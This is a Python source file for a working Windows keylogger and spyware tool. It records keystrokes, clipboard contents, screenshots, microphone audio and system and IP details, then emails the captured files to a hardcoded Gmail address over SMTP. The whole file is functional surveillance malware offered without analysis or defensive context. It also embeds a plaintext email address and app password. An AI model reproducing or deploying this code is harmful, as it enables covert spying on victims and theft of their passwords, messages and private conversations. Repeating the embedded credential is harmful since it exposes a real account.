# Import necessary libraries
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from scipy.io.wavfile import write
import sounddevice as sd
from cryptography.fernet import Fernet
import getpass
from requests import get
from PIL import ImageGrab

# Define filenames and paths
keys_information = "log.txt"
system_information = "system_info.txt"
clipboard_information = "clipboard.txt"
audio_information = "audio.wav"
screenshot_information = "screenshot.png"

# Define constants
microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

# Email setup
email_address = "yukkthas@gmail.com"  # Enter disposable email here
password = "bqyv hedp czao mrmz"  # Enter email password here
toaddr = "yukkthas@gmail.com"  # Destination email

# System user details
username = getpass.getuser()

# File path setup
file_path = "C:\\Users\\yukkt\\PycharmProjects\\pythonProject\\python"  # Update this path as needed
extend = "\\"
file_merge = file_path + extend


# Function to send email with attachment
def send_email(filename, attachment_path, toaddr):
    fromaddr = email_address

    msg = MIMEMultipart()
    msg["From"] = fromaddr
    msg["To"] = toaddr
    msg["Subject"] = "Log File"

    body = "Attached file: " + filename
    msg.attach(MIMEText(body, "plain"))

    try:
        with open(attachment_path, "rb") as attachment:
            p = MIMEBase("application", "octet-stream")
            p.set_payload(attachment.read())

        encoders.encode_base64(p)
        p.add_header("Content-Disposition", f"attachment; filename={filename}")
        msg.attach(p)

        s = smtplib.SMTP("smtp.gmail.com", 587)
        s.starttls()
        s.login(fromaddr, password)
        s.sendmail(fromaddr, toaddr, msg.as_string())
        s.quit()

        print(f"Email sent successfully: {filename}")

    except Exception as e:
        print(f"Failed to send email: {filename} - {e}")


# Send collected files via email
send_email(keys_information, file_merge + keys_information, toaddr)
send_email(screenshot_information, file_merge + screenshot_information, toaddr)
send_email(clipboard_information, file_merge + clipboard_information, toaddr)


# Function to get system information
def computer_information():
    with open(system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")

        f.write("Processor: " + platform.processor() + "\n")
        f.write("System: " + platform.system() + " " + platform.version() + "\n")
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")


computer_information()


# Function to get clipboard contents
def copy_clipboard():
    with open(clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data:\n" + pasted_data + "\n")
        except:
            f.write("Clipboard could not be copied\n")


copy_clipboard()


# Function to record microphone audio
def microphone():
    sample_rate = 44100
    duration = 10  # Corrected spelling
    audio_data = sd.rec(int(sample_rate * duration), samplerate=sample_rate, channels=2, dtype="int16")
    sd.wait()
    write(audio_information, sample_rate, audio_data)


microphone()


# Function to take a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_merge + screenshot_information)


screenshot()


# Initialize keylogger variables
count = 0
keys = []
currentTime = time.time()
stoppingTime = time.time() + time_iteration
number_of_iterations = 0


# Function to capture key presses
def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print("{0} pressed".format(key))

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


# Function to write logged keys to a file
def write_file(keys):
    with open(keys_information, "a") as f:
        for key in keys:
            f.write(str(key) + "\n")  # Added newline for readability


# Function to release keylogger after a set time
def on_release(key):
    global currentTime, stoppingTime, number_of_iterations

    if key == Key.esc:
        return False  # Stop keylogger on ESC key

    if time.time() > stoppingTime:
        with open(file_merge + keys_information, "w") as f:
            f.write(" ")

        screenshot()
        send_email(screenshot_information, file_merge + screenshot_information, toaddr)
        copy_clipboard()
        number_of_iterations += 1
        currentTime = time.time()  # Reset time for the next session
        stoppingTime = time.time() + time_iteration
        return False


# Start keylogger listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
